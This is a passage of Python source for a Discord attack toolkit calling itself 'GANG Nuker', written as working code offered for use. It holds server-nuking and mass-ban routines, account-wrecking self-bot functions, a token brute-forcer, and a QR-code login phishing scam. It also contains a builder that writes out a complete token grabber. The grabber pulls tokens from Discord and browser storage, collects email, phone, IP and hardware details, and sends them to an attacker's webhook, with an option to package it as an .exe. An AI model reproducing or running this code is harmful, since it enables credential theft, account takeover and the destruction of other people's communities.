                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Deleted Role: {role}")
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(server))

                        channelcount = 0
                        with open('utilities/QR/channels.txt', 'w') as c:
                            for channel in guildOBJ.channels:
                                c.write(str(channel.id) + "\n")
                                channelcount += 1
                            c.close()

                        rolecount = 0
                        with open('utilities/QR/roles.txt', 'w') as r:
                            for role in guildOBJ.roles:
                                r.write(str(role.id) + "\n")
                                rolecount += 1
                            r.close()

                    def SpamChannels(self, guild, name):
                        while True:
                            json = {'name': name, 'type': 0}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Created Channel ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} You Cant Create Channels')

                    def SpamRoles(self, guild, name):
                        while True:
                            json = {'name': name}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Created Role ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} You Cant Create Roles...')
                                    break

                    async def NukeStart(self):
                        chh = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Channel Name: ")
                        cha = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Channel Amount: ")
                        rn = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Roles Name: ")
                        ra = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Roles Amount: ")

                        channels = open('utilities/QR/channels.txt')
                        roles = open('utilities/QR/roles.txt')

                        for channel in channels:
                            threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
                        for role in roles:
                            threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
                        for i in range(int(cha)):
                            threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
                        for i in range(int(ra)):
                            threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

                    async def Menu(self):
                        await self.Scrape()
                        time.sleep(2)
                        await self.NukeStart()
                        time.sleep(2)
                        await self.Menu()

                    @client.event
                    async def on_ready(*Args):
                        await UNuker().Menu()

                    def Check(self):
                        client.run(token, bot=False)

                if __name__ == "__main__":
                    UNuker().Check()

                time.sleep(1)
                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
                exit = clear()
                exit = spammer()
            if choicr == '2':
                print(
                    f'{Fore.LIGHTRED_EX}Warning!{Fore.RESET} Make Sure Your Account Is Fully Verified Before Using This Command...!')

                intents = discord.Intents.all()
                intents.members = True

                headerrss = mainHeader(token)
                client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)

                client.remove_command("help")

                class MassBan:

                    def BanMembers(self, guild, member):
                        while True:
                            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",
                                             headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Banning {member}")
                                    break
                                else:
                                    break

                    def KickMembers(self, guild, member):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}",
                                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Kicking {member}')
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        guild = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(guild))
                        members = await guildOBJ.chunk()

                        try:
                            os.remove("utilities/QR/members.txt")
                        except:
                            pass

                        membercount = 0
                        with open('utilities/QR/members.txt', 'w') as m:
                            for member in members:
                                m.write(str(member.id) + "\n")
                                membercount += 1
                            print(f"Info: {membercount} Members")
                            m.close()

                    async def BanExecute(self):
                        guild = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
                        print()
                        members = open('utilities/QR/members.txt')
                        for member in members:
                            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                        members.close()

                    async def KickExecute(self):
                        guild = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
                        print()
                        members = open('utilities/QR/members.txt')
                        for member in members:
                            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
                        members.close()

                    async def Menu(self):
                        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m]  MassBan')
                        print(f'[\x1b[95m2\x1b[95m\x1B[37m]  MassKick')

                        choice = input(f'[\x1b[95m>>>\x1b[95m\x1B[37m] ')
                        if choice == '1':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('[\x1b[95m>\x1b[95m\x1B[37m] MassBAN y/n?: ').lower()
                            if sure == 'n':
                                await self.BanExecute()
                                time.sleep(2)
                                await self.Menu()

                            if sure == 'n':
                                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                        elif choice == '2':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('[\x1b[95m>\x1b[95m\x1B[37m] MassKick y/n?: ').lower()
                            if sure == 'y':
                                await self.KickExecute()
                                time.sleep(2)
                                await self.Menu()
                            if sure == 'n':
                                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                    @client.event
                    async def on_ready(*args):
                        await MassBan().Menu()

                    def Startup(self):
                        try:
                            client.run(token, bot=False)


                        except:
                            print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Invalid Token...')
                            time.sleep(2)
                            exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
                            exit = clear()
                            exit = spammer()

                if __name__ == "__main__":
                    MassBan().Startup()

                time.sleep(1)
                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
                exit = clear()
                exit = spammer()

        if choicee1 == '2':
            TOKEN = input('[\x1b[95m>\x1b[95m\x1B[37m] Bot Token: ')
            MAX_CHANNELS = 300
            print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Nuke Server?')
            print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Server MassBan?')

            choicee = input('[\x1b[95m>\x1b[95m\x1B[37m] ')

            if choicee == '1':
                chanless = input('[\x1b[95m>\x1b[95m\x1B[37m] Spam Channel Name?: ')
                spam = input('[\x1b[95m>\x1b[95m\x1B[37m] Mass Message Spammer?: ')
                print(f'{Fore.LIGHTMAGENTA_EX}Type: !Nuke In Chat To Nuke The Server <3{Fore.RESET}')
                client = commands.Bot(command_prefix="!")

                @client.command()
                async def Nuke(ctx):
                    await ctx.message.delete()
                    guild = ctx.guild

                    for role in guild.roles:
                        try:
                            await role.delete()
                            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET}{role.name} Has Been Deleted{Fore.RESET}')
                        except:
                            print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET}{role.name} Has Not Been Deleted...')

                    for channel in guild.channels:
                        try:
                            await channel.delete()
                            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET}{channel.name} Has Been Deleted')
                        except:
                            print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} You Cant Delete: {channel}...')

                    try:
                        for i in range(MAX_CHANNELS):
                            await guild.create_text_channel(chanless)
                            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET}{chanless} Has Been Created!')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to create channels')

                @client.event
                async def on_guild_channel_create(channel):
                    while True:
                        try:
                            await channel.send(spam)
                            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} SPAMMIMG :)')

                        except:
                            print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Spamming Cancelled...')

                def thread():
                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()

                thread()

                def thread2():
                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()

                thread2()

            if choicee == '2':
                print(f'{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX}[>]{Fore.RESET} Type !massban in chat to Massban...{Fore.RESET}')
                headers = {
                    "Authorization":
                        f"Bot {TOKEN}"
                }

                client2 = commands.Bot(
                    command_prefix='!',
                    intents=discord.Intents.all(),
                    help_command=None
                )

                @client2.command()
                async def massban(ctx):
                    await ctx.message.delete()
                    servr = ctx.guild.id

                    def mass_ban(i):
                        sessions = requests.Session()
                        sessions.put(
                            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
                            headers=headers
                        )

                    for i in range(3):
                        for member in list(ctx.guild.members):
                            threading.Thread(
                                target=mass_ban,
                                args=(member.id,)
                            ).start()
                    print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done...')

                client2.run(TOKEN)

        time.sleep(5)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter ')
        exit = clear()
        exit = spammer()

    if choice == '7':
        os.system('cls')
        Spinner()
        os.system('cls')
        tokenn = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ")

        print(f'''{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Server Spam
{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Remove all Friends
{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Block all Friends
{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Spam Settings
{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} Leave all Servers
{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Close all DMs
{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Friend Mass DM
{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} Delete all Personal Servers''')

        def servers(token):
            cumt = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Channels Do You Want To Create?: '))
            server_name = input('[\x1b[95m>\x1b[95m\x1B[37m] Server Name: ')
            headers = mainHeader(token)
            for i in range(cumt):
                payload = {"name": server_name}
                requests.post(
                    "https://discord.com/api/v9/guilds", headers=headers, json=payload
                )

        def remove_friends(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            rmvfr = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in rmvfr:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Removed Friend {i['id']}")

        def block_friends(token):
            headers = {"authorization": token, "user-agent": "bruh6/9"}
            json = {"type": 2}
            blck = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in blck:
                requests.put(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                    json=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[!] Blocked Friend {i['id']} {Fore.RESET}")

        def settings(token):
            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Starting')
            for i in range(0, 100):
                headers = mainHeader(token)
                changset = True
                payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                           "message_display_compact": changset, "explicit_content_filter": 2,
                           "default_guilds_restricted": changset,
                           "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                                   "mutual_guilds": changset},
                           "inline_embed_media": changset, "inline_attachment_media": changset,
                           "gif_auto_play": changset, "render_embeds": changset,
                           "render_reactions": changset, "animate_emoji": changset,
                           "convert_emoticons": changset, "animate_stickers": 1,
                           "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                           "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                           "stream_notifications_enabled": changset, "status": "idle",
                           "detect_platform_accounts": changset, "disable_games_tab": changset}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
                changset = False
                payload = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                           "message_display_compact": changset, "explicit_content_filter": 0,
                           "default_guilds_restricted": changset,
                           "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                                   "mutual_guilds": changset},
                           "inline_embed_media": changset, "inline_attachment_media": changset,
                           "gif_auto_play": changset, "render_embeds": changset,
                           "render_reactions": changset, "animate_emoji": changset,
                           "convert_emoticons": changset, "animate_stickers": 2,
                           "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                           "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                           "stream_notifications_enabled": changset, "status": "dnd",
                           "detect_platform_accounts": changset, "disable_games_tab": changset}
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)

        def server_leave(token):
            headers = {"authorization": token, "user-agent": "bruh6/9"}
            levlservr = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for serr in levlservr:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/guilds/{serr['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[!]{Fore.RESET} Left Guild: {serr['id']}")

        def dms_close(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            clsdms = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for channel in clsdms:
                requests.delete(
                    f"https://discord.com/api/v9/channels/{channel['id']}",
                    headers=headers,
                )

        def mass_dm(token):
            message = input('Message: ')
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            reqmas = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for chen in reqmas:
                json = {"content": message}
                time.sleep(1)
                requests.post(
                    f"https://discord.com/api/v9/channels/{chen['id']}/messages",
                    headers=headers,
                    data=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {chen['id']} Sent")

        def delete_servers(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Deleting...")
            dmms = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for i in dmms:
                requests.post(
                    f"https://discord.com/api/v9/guilds/{i['id']}/delete",
                    headers=headers,
                )
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {i["id"]} deleted')

        options = {
            "1": servers,
            "2": remove_friends,
            "3": block_friends,
            "4": settings,
            "5": server_leave,
            "6": dms_close,
            "7": mass_dm,
            "8": delete_servers
        }

        def main():
            choiceee = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")
            threading.Thread(target=options[choiceee](tokenn)).start()

        if __name__ == "__main__":
            while 1:
                main()

        time.sleep(1)

        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '20':
        os.system('cls')
        Spinner()
        os.system('cls')
        print('[\x1b[95m>\x1b[95m\x1B[37m] Start Bruteforcer ATTACK! <3')

        id_to_token = base64.b64encode((input("[\x1b[95m>\x1b[95m\x1B[37m] ID of User: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]

        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))

                headers = {'Authorization': token}

                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} VALID' + ' ' + token)
                        f = open('utilities/QR/grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} INVALID' + ' ' + token)
                finally:
                    print('')

        def thread():
            while True:
                threading.Thread(target=bruteforece).start()

        thread()

        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '5':
        os.system('cls')
        Spinner()
        os.system('cls')
        global filename, webhooklink
        fileName = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] File Name: ")
        webhooklink = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL: ")

        try:
            with open(f"{fileName}.py", "w") as file:
                file.write("""import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\\\Discord",
    "Discord Canary"    : ROAMING + "\\\\discordcanary",
    "Discord PTB"       : ROAMING + "\\\\discordptb",
    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 12208895,
                "fields": [
                    {
                        "name": "**Account Info:**",
                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info:**",
                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token:**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "GANG GRABBER <3",
        "avatar_url": "https://media.discordapp.net/attachments/878154522978029582/917679300705124412/a4235fd1da45633adbc305450741b506.png"
    }
    try:
        urlopen(Request("~~TOKENURLHERE~~", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    
main()""".replace("~~TOKENURLHERE~~", webhooklink))

        except Exception as e:
            print(f"""\t\t[!] Error Writing File: {e}\n""")
            main()

        print(f"""[\x1b[95m#\x1b[95m\x1B[37m] File has been correctly written to "{fileName}.py"\n""")
        convert = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Convert Your Script Into an .EXE (y/n)?: ").lower()
        if convert == 'y':
            try:
                os.system(f"pyinstaller --onefile -i NONE {fileName}.py")
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.rmtree(f"__pycache__")
                print(f"""{Fore.LIGHTMAGENTA_EX}[>]{Fore.RESET} {Fore.LIGHTGREEN_EX}The executable file has been correctly generated. Look in {Fore.WHITE}"dist"{Fore.RESET} folder{Fore.RESET}\n""")
            except Exception as e:
                    print(f"[!] Error: {e}")
        else:
            print()
        main()

        if choice == '\\//':

            def lg():
                rqr = Image.open('untilites/QR/bg.png', 'r')
                plca = Image.open('untilites/QR/dslg.png', 'r')
                rqr.paste(plca, (60, 55))
                rqr.save('untilites/QR/final_qr.png', quality=95)

            def bgg():
                bggg = Image.open('untilites/QR/bg.png', 'r')
                fqr = Image.open('untilites/QR/final_qr.png', 'r')
                bggg.paste(fqr, (120, 409))
                bggg.save('untilites/QR/qrcode_gift.png', quality=95)

            def qrscam():
                driver = webdriver.Chrome(ChromeDriverManager().install())
                driver.get('https://discord.com/login')
                time.sleep(5)

                page_source = driver.page_source

                soup = BeautifulSoup(page_source, features='lxml')

                loca = soup.find('div', {'class': 'qrCode-wG6ZgU'})
                qrcod = loca.find('img')['src']
                file = os.path.join(os.getcwd(), 'untilites/QR/qr_code.png')

                pr = base64.b64decode(qrcod.replace('data:image/png;base64,', ''))

                with open(file, 'wb') as handler:
                    handler.write(pr)

                lg()
                bgg()

                print('{Fore.LIGHTMAGENTA_EX}[>]{Fore.RESET} QR Code Has Been Generated')
                print('{Fore.LIGHTMAGENTA_EX}[>]{Fore.RESET} Dont close GANG Nuker, wait for the victim to scan the QR code')
                os.remove('utilites/QR/qr_code.png')
                os.remove('utilites/QR/final_qr.png')

                while True:
                    pass

            if __name__ == '__main__':
                qrscam()

        time.sleep(1)

        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '22':
        os.system('cls')
        Spinner()
        os.system('cls')
        token = input('[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
        UserID = input('[\x1b[95m>\x1b[95m\x1B[37m] Enter User ID: ')
        group = input('[\x1b[95m>\x1b[95m\x1B[37m] Group Names: ')
        manygr = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Groups: '))

        headers = mainHeader(token)


        for i in range(manygr):
            try:
                r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
                                  json={"recipients": []})

                jsr = json.loads(r.content)
                groupID = jsr['id']
                time.sleep(0.5)
                r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
                                    json={'name': group})
                if r1.status_code == 200:
                    print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Group created')

                with open("utilities/QR/groups.txt", "w") as groupID:
                    groupID.write(jsr['id'] + '\n')

            except:
                print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])

            scrIds = random.choice(open('utilities/QR/groups.txt').readlines())
            grID = scrIds.strip('\n')
            r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                              headers={'Authorization': token})
            if r2.status_code == 204:
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {UserID} added to group')

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()


    if choice == '24':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'''{Fore.WHITE} \n\nHello Buddy, just a quick message talking about GANG Nuker!
- This "GANG Nuker" was created / dev by ††#7777
- Make sure to make a 'issue' on my github if there is a problem or dm me on discord! @††#3333
- unknown person... (from the uk)
- Thanks for using my tools and make sure not to skid it <3
- if you enjoy this make sure to star it and follow my Github!
{Fore.RESET}''')

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()


    if choice == '30':
            os.system('cls')
            print("\n> Thanks For Using GANG Nuker! <") 
            time.sleep(3)
            exit(0)

    if choice == '15':
            os.startfile(os.getcwd() + '/utilities/other/ws/webhookspammer.exe')


    if choice == '0':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'''\n\n\n[\x1b[95m>\x1b[95m\x1B[37m] Thanks For Using GANG Nuker <3{Fore.RESET}''')

        time.sleep(1)        
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '25':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'''
{Fore.RED}[!]{Fore.RESET} {Fore.WHITE}DM ††#7777 For A Paid Token Generator...{Fore.RESET}

{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Start Generating Tokens?
{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Exit
''')
        tool = input("[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")
        if tool == "100":
            token = input("Token: ")
            with open('---', 'w') as f:
                f.write('''{
    "token": "%s",
    "password": "",
    "prefix": ">",
    "nitro_sniper": false
}
''' % (token))
            time.sleep(1)
            call(["python", "--"])
        elif tool == "---":
            token = input("[>] Token: ")
            with open('---', 'w') as f:
                f.write('''{
  "token": "%s",
  "errorlog": "Error!"
}	
''' % (token))
            time.sleep(1)
        elif tool == "1":
            os.startfile(os.getcwd() + '/utilities/other/TG/start.bat')
        elif tool == "2":
            os.system('cls')
            print("[\x1b[95m>\x1b[95m\x1B[37m] Exiting...") 
            time.sleep(3)
            exit(0)


    if choice == '26': 
        os.system('cls')
        Spinner()
        os.system('cls')
        os.startfile(os.getcwd() + '/utilities/other/NG/start.bat')


    if choice == '28': 
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('utilities/other/rat/rat.py').read())

    if choice == '23':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('utilities/other/AL/autologin.py').read())

    if choice == '27':
        os.system('cls')
        Spinner()
        os.system('cls')
        os.startfile(os.getcwd() + '/utilities/advgrab/build-exe.bat')

spammer()